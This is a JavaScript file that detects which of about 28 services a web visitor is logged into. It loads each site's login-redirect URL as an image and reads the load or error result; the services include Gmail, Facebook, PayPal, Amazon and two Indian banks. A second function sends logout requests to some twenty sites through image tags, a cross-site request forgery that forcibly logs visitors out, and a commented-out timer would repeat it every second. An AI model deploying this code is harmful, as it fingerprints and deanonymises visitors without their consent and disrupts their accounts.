var login_platforms = [{
  domain: "https://accounts.google.com",
  redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
  name: "Gmail",
  loggedIn: false,
},{
  domain: "https://accounts.google.com",
  redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
  name: "Youtube",
  loggedIn : false,
},{
	domain: "https://outlook.live.com",
	redirect: "/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
	name: "Outlook",
	loggedIn : true,
},{
   domain: "https://www.khanacademy.org",
   redirect: "/login?continue=%2Ffavicon.ico",
   name: "KhanAcademy",
   loggedIn : false,
   },
   {
   domain: "https://retail.onlinesbi.com",
   redirect: "/retail/mypage.htm",
   name: "SBI",
   loggedIn : false,
   },{
  domain: "https://riders.uber.com",
  redirect: "/login/?next_url=https://riders.uber.com/",
   name: "Uber",
   loggedIn : false,
   logoutPath:"/logout"
  }, {
  domain: "https://secure.skype.com",
  redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
  name: "Skype",
  loggedIn: false
  }, {
  	domain: "https://www.iobnet.co.in",
  	redirect: "",
  	name: "IOB",
    loggedIn: false
  },{
  domain: "https://www.messenger.com",
  redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fwww.messenger.com%2Ffavicon.ico",
  name: "Messenger",
  loggedIn: false 
   },
  {
    domain: "https://squareup.com",
    redirect: "/login?return_to=%2Ffavicon.ico",
    name: "Square",
    loggedIn: false
  },
  {
    domain: "https://twitter.com",
    redirect: "/login?redirect_after_login=%2Ffavicon.ico",
    name: "Twitter",
    loggedIn: false
  },
  {
    domain: "https://www.facebook.com",
    redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
    name: "Facebook",
    loggedIn: false  
  },
  {
    domain: "https://www.spotify.com",
    redirect: "/en/login/?forward_url=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico",
    name: "Spotify",
    loggedIn: false
  },
  {
    domain: "https://www.reddit.com",
    redirect: "/login?dest=https%3A%2F%2Fwww.reddit.com%2Ffavicon.ico",
    name: "Reddit",
    loggedIn: false
  }, 
  {
    domain: "https://www.tumblr.com",
    redirect: "/login?redirect_to=%2Ffavicon.ico",
    name: "Tumblr",
    loggedIn: false
  }, 
  {
    domain: "https://www.expedia.de",
    redirect: "/user/login?ckoflag=0&selc=0&uurl=qscr%3Dreds%26rurl%3D%252Ffavicon.ico",
    name: "Expedia",
    loggedIn: false
  }, 
  {
  domain: "https://www.dropbox.com",
  redirect: "/login?cont=https%3A%2F%2Fwww.dropbox.com%2Fstatic%2Fimages%2Fabout%2Fdropbox_logo_glyph_2015.svg",
  name: "Dropbox",
  loggedIn: false
  }, 
  {
    domain: "https://www.amazon.com",
    redirect: "/ap/signin/178-4417027-1316064?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=10000000&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Ffavicon.ico",
    name: "Amazon.com",
    loggedIn: false
  },
  {
    domain: "https://www.pinterest.com",
    redirect: "/login/?next=https%3A%2F%2Fwww.pinterest.com%2Ffavicon.ico",
    name: "Pinterest",
    loggedIn: false
  }, 
  {
    domain: "https://store.steampowered.com",
    redirect: "/login/?redir=favicon.ico",
    name: "Steam",
    loggedIn: false
  },
  {
    domain: "https://www.academia.edu",
    redirect: "/login?cp=/favicon.ico&cs=www",
    name: "Academia.edu",
    loggedIn: false
  },
  {
    domain: "https://github.com",
    redirect: "/login?return_to=https%3A%2F%2Fgithub.com%2Ffavicon.ico%3Fid%3D1",
    name: "Github",
    loggedIn: false 
  },
  {
    domain: "https://medium.com",
    redirect: "/m/signin?redirect=https%3A%2F%2Fmedium.com%2Ffavicon.ico&loginType=default",
    name: "Medium",
    loggedIn: false
  },
  {
    domain: "https://news.ycombinator.com",
    redirect: "/login?goto=y18.gif%23",
    name: "Hackernews",
    loggedIn: false
  },
  {
    domain: "https://slack.com",
    redirect: "/checkcookie?redir=https%3A%2F%2Fslack.com%2Ffavicon.ico%23",
    name: "Slack",
    loggedIn: false

  },
  {
    domain: "https://www.paypal.com",
    redirect: "/signin?returnUri=https://t.paypal.com/ts?v=1.0.0",
    name: "Paypal",
    loggedIn: false
  }, 
  {
    domain: "https://vk.com",
    redirect: "/login?u=2&to=ZmF2aWNvbi5pY28-",
    name: "VK",
    loggedIn: false
  }];

var login_platforms = [
 {
    domain: "https://www.facebook.com",
    redirect: "/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico%3F_rdr%3Dp",
    name: "Facebook",
    loggedIn: false  
  }]
// Do not work (anymore)
// {
//     url: "https://login.live.com/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
//     name: "Microsoft"
// }, {
//     url: "https://slack.com/signin?redir=%2Ffavicon.ico",
//     name: "Slack"
// }, {
//     url: "https://tablet.www.linkedin.com/splash?redirect_url=https%3A%2F%2Fwww.linkedin.com%2Ffavicon.ico%3Fgid%3D54384%26trk%3Dfulpro_grplogo",
//     name: "Linkedin"
// }, {
//      domain: "https://subscribe.washingtonpost.com/loginregistration/index.html#/register/group/default?action=login&destination=https:%2F%2Fwashingtonpost.com%2Ffavicon.ico",
//      redirect: "/login/?previous=/favicon.ico",
//      name: "Washington Post"
// }, {
//      domain: "https://www.instagram.com",
//      redirect: "/accounts/login/?next=%2Ffavicon.ico",
//      name: "Instagram"
//  },{
//     domain: "https://www.spiegel.de",
//     redirect: "/meinspiegel/login.html?backUrl=%2Ffavicon.ico",
//     name: "Spiegel Online"
// },{
//     domain: "http://www.youporn.com",
//     redirect: "/login/?previous=/favicon.ico",
//     name: "YouPorn"
// },{
//     domain: "https://stackoverflow.com",
//     redirect: "/users/login?ssrc=head&returnurl=http%3a%2f%2fstackoverflow.com%2ffavicon.ico",
//     name: "Stack Overflow"
// },{
//     domain: "https://www.netflix.com",
//     redirect: "/Login?nextpage=%2Ffavicon.ico",
//     name: "Netflix"
// },{
//      domain: "https://www.flickr.com",
//      redirect: "/signin/yahoo/?redir=https%3A%2F%2Fwww.flickr.com/favicon.ico",
//      name: "Flickr"
//   }
// {
//   domain: "https://bitbucket.org",
//   redirect: "/account/signin/?next=/favicon.ico",
//   name: "BitBucket",
//   loggedIn: false
// },
  // {
  //   domain: "https://plus.google.com",
  //   redirect: "/up/accounts/upgrade/?continue=https://plus.google.com/favicon.ico",
  //   name: "Google Plus",
  //   loggedIn: false
  // }

logout_platforms=[{
  name: "Gmail",
  logoutPath:"https://accounts.google.com/logout"
  },{
  name: "Youtube",
  logoutPath:"https://accounts.google.com/logout"      
  },{
  name: "Outlook",
  logoutPath:"https://outlook.live.com/owa/logoff.owa"      
  },{
   name: "KhanAcademy",
   logoutPath: "https://www.khanacademy.org/logout?continue=/",
  },{
   name: "SBI",
   logoutPath:"https://retail.onlinesbi.com/retail/logout.htm"
  },{
   name: "Uber",
   logoutPath:"https://riders.uber.com/logout"
  },{
  name: "Skype",
  logoutPath:"https://secure.skype.com/portal/logout"
  },{
  name: "IOB",
  logoutPath: "https://www.iobnet.co.in/ibanking/logout.do"
  },{
  name: "Messenger",
  logoutPath:"https://www.messenger.com/logout"
  },{
    name:"Yahoo",
    logoutPath: "https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/"
  },{
    name:"Windows Live",
    logoutPath: "http://login.live.com/logout.srf"
  },{
    name: "Wikipedia",
    logoutPath: "http://en.wikipedia.org/w/index.php?title=Special:UserLogout"
  },{
    name:"Dropbox",
    logoutPath: "https://www.dropbox.com/logout"
  },{
    name:"eBay",
    logoutPath:"https://signin.ebay.com/ws/eBayISAPI.dll?SignIn"
  },{
    name:"GitHub",
    logoutPath: "https://github.com/logout"
  },{
    name: "NetFlix",
    logoutPath: "http://www.netflix.com/Logout"
  },{
    name: "Skype",
    logoutPath: "https://secure.skype.com/account/logout"
  },{  
    name: "SoundCloud",
    logoutPath: "https://soundcloud.com/logout"
  },{
    name: "Steam Community",
    logoutPath: "http://steamcommunity.com/?action=doLogout"
  },{
    name: "Tumblr",
    logoutPath: "http://www.tumblr.com/logout"
  }];
// The site doesn't work anymore on 
// {
//   name: "BitBucket",
//   logoutPath: "https://bitbucket.org/account/signout"
//   }
// {
//     name:"Vimeo",
//     logoutPath: "http://vimeo.com/log_out"
//   }

var lastLoggedInTime={};
var refreshToken={};


var leakSocialMediaAccounts = function(callback) {
  
  login_platforms.forEach(function(network) {
  	if(network.loggedIn===false){
	    var img = document.createElement('img');
	    img.src = network.domain + network.redirect;
	    img.onload = function() {
	      network.loggedIn=true;
	      var now = new Date().getTime();
	      lastLoggedInTime[network.name]=now;
	      callback(network, true);
	    };
	    img.onerror = function() {
	      network.loggedIn=false;            
	      callback(network, false);
	    };
    }

  });
};

var isFirstLoggedIn = true;
function displayResult(network, loggedIn) {
  var id = loggedIn ? 'loggedIn' : 'notLoggedIn';
  var favicon = faviconUri(network);
  var url = network.domain + network.redirect;
  var el = '  <a target="_blank" href="' 
            + url 
            + 
            '" target="_blank" class="network btn"><img width="20" height="20" src='
            + favicon 
            + '> <span>' 
            + network.name + 
            '</span></a>';
               
  if (loggedIn && isFirstLoggedIn) {
    isFirstLoggedIn = false;
    document.getElementById(id).innerHTML = el;
  } else {
    document.getElementById(id).innerHTML += el;
  }
}

 leakSocialMediaAccounts(displayResult);


function faviconUri(network) {
  var favicon = network.domain + '/favicon.ico';
  if (network.name === 'Dropbox') {
    favicon = 'https://www.dropbox.com/static/images/favicon.ico';
  }
  if (network.name === 'Youtube') {
    favicon = 'https://www.youtube.com/favicon.ico';
  }
  if (network.name === 'Gmail') {
    favicon = 'https://mail.google.com/favicon.ico';
  }
  
  return favicon;
}

function logOutUser(){
  
  logout_platforms.forEach(function(network) {
  	console.log(network.name);

      var img = document.createElement('img');
      img.src = network.logoutPath;
      
      console.log('Checking');
      console.log(img.src);      
      img.onload = function() {
		//This fuction will never be called because these url dont return an image
      };
      
      img.onerror = function() {
      	console.log("Logging you out of " + network.name);          				            
      };
  });
};


// setInterval(logOutUser,1000);	
